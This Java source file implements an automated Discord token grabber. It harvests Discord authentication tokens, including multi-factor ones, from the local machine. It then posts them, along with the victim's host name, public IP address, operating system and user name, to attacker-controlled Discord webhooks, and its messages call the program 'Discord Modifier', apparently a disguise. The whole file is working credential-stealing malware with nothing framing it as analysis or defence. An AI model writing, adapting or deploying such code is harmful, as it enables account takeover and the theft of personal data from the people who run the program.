package com.bechris100.remote4j.discord;

import com.bechris100.remote4j.discord.net.NetworkCheck;
import com.bechris100.remote4j.commons.utils.RuntimeEnvironment;
import com.bechris100.remote4j.commons.utils.Utility;

import java.awt.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;

public class DiscordTokenLoggerAutomated {

    private static List<String> tokensList = new ArrayList<>();

    private static boolean nonMultiFactorTokens = false, multiFactorTokens = false;

    public static void gatherTokens() {
        new Thread(() -> {
            try {
                DiscordTokenLogger d = new DiscordTokenLogger();
                d.setUseMultiFactorTokenRegex(false);

                List<String> l = d.getTokens(false);

                tokensList.addAll(l);

                nonMultiFactorTokens = true;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();

        new Thread(() -> {
            try {
                DiscordTokenLogger d = new DiscordTokenLogger();
                d.setUseMultiFactorTokenRegex(true);

                List<String> l = d.getTokens(false);
                tokensList.addAll(l);

                multiFactorTokens = true;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();

        new Thread(() -> {
            while (true) {
                if (nonMultiFactorTokens && multiFactorTokens) {
                    if (NetworkCheck.a()) {
                        tokensList = Utility.removeDuplicates(tokensList);

                        sendData();
                        break;
                    }
                } else {
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
        }).start();
    }

    private static void sendData() {
        new Thread(() -> {
            try {
                DiscordWebhook grabberInfo = new DiscordWebhook(WebhookUrls.DISCORD_TOKENS);
                grabberInfo.setContent("@everyone 'Discord Modifier' has dropped new Tokens. Care to check them out?");
                grabberInfo.setTts(false);

                DiscordWebhook.EmbedObject embedInfo = new DiscordWebhook.EmbedObject()
                        .setTitle("Tokens List")
                        .setDescription("Lists of captured Discord Tokens")
                        .setColor(Color.RED);

                if (tokensList.size() == 0)
                    embedInfo.addField("## Token Data ##", "Not found", false);
                else if (tokensList.size() == 1)
                    embedInfo.addField("Token", tokensList.get(0), false);
                else {
                    for (int i = 0; i < tokensList.size(); i++)
                        embedInfo.addField("Token Entry " + (i + 1), tokensList.get(i), false);
                }

                grabberInfo.addEmbed(embedInfo);
                grabberInfo.execute();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();

        new Thread(() -> {
            try {
                DiscordWebhook userInfo = new DiscordWebhook(WebhookUrls.USER_INFO);
                userInfo.setContent("@everyone 'Discord Modifier' has dropped new Device Information. Care to check it out?");
                userInfo.setTts(false);

                DiscordWebhook.EmbedObject embedInfo = new DiscordWebhook.EmbedObject()
                        .setTitle("Info List")
                        .setDescription("Information gathered")
                        .setColor(Color.RED);

                if (Utility.getLineSeparator(RuntimeEnvironment.getHostName()).isEmpty())
                    embedInfo.addField("Device Name", RuntimeEnvironment.getHostName(), false);
                else
                    embedInfo.addField("Device Name",
                            RuntimeEnvironment.getHostName()
                                    .replaceAll(Matcher.quoteReplacement(Utility.getLineSeparator(RuntimeEnvironment.getHostName())), ""),
                            false);

                embedInfo.addField("IP Address", getIp(), false);
                embedInfo.addField("Operating System", RuntimeEnvironment.OS_NAME + " on " + RuntimeEnvironment.OS_VERSION, false);
                embedInfo.addField("User Name", RuntimeEnvironment.USER_NAME, false);

                userInfo.addEmbed(embedInfo);
                userInfo.execute();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private static String getIp() throws Exception {
        final String p = "https://api.ipify.org/?format=txt&callback=?";

        URL u = new URL(p);
        URLConnection c = u.openConnection();
        c.connect();

        InputStream is = c.getInputStream();
        StringBuilder str = new StringBuilder();
        int data;

        while ((data = is.read()) != -1)
            str.append((char) data);

        return str.toString();
    }

}
